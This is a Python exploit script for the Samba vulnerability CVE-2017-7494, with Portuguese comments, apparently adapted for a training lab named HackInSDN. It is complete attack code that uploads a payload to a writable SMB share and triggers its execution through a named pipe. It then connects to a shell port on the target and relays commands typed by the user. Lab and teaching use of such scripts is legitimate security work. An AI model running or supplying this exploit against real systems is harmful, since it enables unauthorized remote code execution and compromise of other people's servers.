#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
    Exploit red-wheelbarrow (CVE-2017-7494)
    Versão pro lab HackInSDN (FelipeR)
"""

import sys
import os
import time
import socket
from threading import Thread
from argparse import ArgumentParser

try:
    from impacket.dcerpc.v5 import samr, transport, srvs
    from impacket.dcerpc.v5.dtypes import NULL
    from impacket.smbconnection import SMBConnection, SessionError
except ImportError:
    print("[ERRO] Biblioteca 'impacket' não encontrada.")
    print("[DICA] Instale no atacante com: pip3 install impacket")
    sys.exit(1)

def dce_trigger(dce):
    """Tenta conectar ao named pipe pra disparar o exploit."""
    try:
        dce.connect()
    except SessionError as e:
        # Except esperada, o módulo carrega e quebra.
        print(f"[INFO] Exceção esperada do Samba (SessionError): {e}")
    except Exception as e:
        print(f"[ERRO] Algo deu errado ao acionar o DCE: {e}")

def receive_and_print(sock):
    """Thread que recebe e printa o que vier do shell reverso (se houver)."""
    try:
        while True:
            data = sock.recv(1024)
            if not data:
                break
            # tenta decodificar como UTF-8
            sys.stdout.write(data.decode('utf-8', errors='ignore'))
            sys.stdout.flush()
    except Exception as e:
        print(f"\n[ERRO] Erro na thread de recepção: {e}")

# Função principal 
def exploit(target, port, executable_path, remote_share, remote_path, user, password, shell_port):
    """Executa o fluxo principal do exploit."""

    # Verificação do arquivo de payload
    print(f"[*] Checando payload: {executable_path}")
    if not os.path.exists(executable_path):
        print(f"[ERRO] Payload não encontrado em '{executable_path}'")
        return

    payload_name = os.path.basename(executable_path)
    print(f"[OK] Payload: {payload_name}")

    # Conexão SMB
    print(f"[*] Conectando ao alvo {target} na porta {port}...")
    try:
        smb_client = SMBConnection(target, target, sess_port=port)
    except Exception as e:
        print(f"[ERRO] Falha ao iniciar conexão SMB: {e}")
        return

    if user:
        try:
            if not smb_client.login(user, password):
                raise Exception("Falha na autenticação")
            print("[OK] Autenticação SMB feita com sucesso.")
        except Exception as e:
            print(f"[ERRO] Falha na autenticação: {e}")
            return
    else:
        print("[INFO] Tentando acesso anônimo (sem usuário/senha)...")

    # Upload do payload
    print(f"[*] Enviando payload ({payload_name}) pra pasta compartilhada '{remote_share}'...")
    try:
        with open(executable_path, 'rb') as f:
            smb_client.putFile(remote_share, payload_name, f.read)
        print("[OK] Payload enviado.")
    except Exception as e:
        print(f"[ERRO] Não foi possível enviar o payload pra '{remote_share}': {e}")
        print("[INFO] Confere se a pasta compartilhada existe e se tem permissão de escrita.")
        return

    # Acionar o exploit
    print("[*] Acionando a vulnerabilidade (CVE-2017-7494)...")
    trigger_module = rf'ncacn_np:{target}[\pipe\{remote_path}]'

    try:
        rpc_transport = transport.DCERPCTransportFactory(trigger_module)
        dce = rpc_transport.get_dce_rpc()
    except Exception as e:
        print(f"[ERRO] Falha ao criar transporte RPC: {e}")
        return

    # Rodar o trigger em thread à parte (a chamada principal tende a travar)
    trigger_thread = Thread(target=dce_trigger, args=(dce,))
    trigger_thread.daemon = True
    trigger_thread.start()

    print("[INFO] Trigger disparado em background. Aguardando 2 segundos...")
    time.sleep(2)

    # Se não foi passada porta de shell, terminamos 
    if not shell_port:
        print("[OK] Pronto — payload (provavelmente) executado no alvo.")
        print("[INFO] Sem porta de shell informada, não tem mais o que fazer.")
        return

    # Se informou porta de shell, tentamos conectar
    print(f"[*] Tentando conectar ao shell reverso em {target}:{shell_port}...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((target, int(shell_port)))
        print(f"[OK] Conectado ao shell em {target}:{shell_port}.")

        # Inicia thread que imprime oq chegar
        receive_thread = Thread(target=receive_and_print, args=(sock,))
        receive_thread.daemon = True
        receive_thread.start()

        print("[INFO] Agora você pode rodar comandos (ex: 'uname -a', 'ls /home'). Digite 'exit' pra sair.")
        while True:
            command = input(">> ")
            if command.strip() == "exit":
                break
            sock.send((command + "\n").encode('utf-8'))

        sock.close()
    except Exception as e:
        print(f"[ERRO] Não foi possível conectar ao shell reverso: {e}")

# Input 
if __name__ == "__main__":
    parser = ArgumentParser(description="Exploit red-wheelbarrow (CVE-2017-7494) - (HackInSDN)")
    
    parser.add_argument("-t", "--target", required=True, help="IP ou hostname do alvo")
    parser.add_argument("-e", "--executable", required=True, help="Arquivo do payload (ex: payload.sh)")
    parser.add_argument("-s", "--remoteshare", required=True, help="Share de escrita no alvo (ex: 'public')")
    parser.add_argument("-r", "--remotepath", required=True, help="Caminho completo do payload no alvo (ex: '/tmp/payload.sh')")
    
    # Opcionais
    parser.add_argument("-u", "--user", required=False, help="Usuário Samba (opcional)")
    parser.add_argument("-p", "--password", required=False, help="Senha Samba (opcional)")
    parser.add_argument("-P", "--remoteshellport", required=False, help="Porta do shell reverso (opcional)")

    args = vars(parser.parse_args())
    port = 445  # porta SMB padrão

    try:
        print("[*] Iniciando exploit...")
        exploit(
            args["target"],
            port,
            args["executable"],
            args["remoteshare"],
            args["remotepath"],
            args["user"],
            args["password"],
            args["remoteshellport"]
        )
    except KeyboardInterrupt:
        print("\n[*] Operação abortada pelo usuário.")
    except Exception as e:
        print(f"\n[ERRO] Ocorreu um erro: {e}")
